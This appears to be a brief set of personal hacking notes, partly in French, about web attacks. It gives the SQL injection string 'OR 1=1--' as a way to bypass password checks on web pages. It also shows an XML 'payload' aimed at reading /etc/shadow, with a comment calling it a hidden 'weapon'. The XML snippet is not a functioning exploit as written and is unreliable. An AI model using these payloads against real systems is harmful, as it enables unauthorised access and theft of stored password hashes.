language SQL reponse toujours vrai :
bash```` 'OR 1 =1--'```` 
- faille SQL    (permet de contourner des mots de passe et autre faille dans une page web)

bash ````
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <meta name="source">/var/log/auth.log</meta>
    <data id="payload">
        <!-- This comment hides the real weapon -->
        <file path="/etc/shadow"/>
        <read mode="raw"/>
    </data>
</root>
````
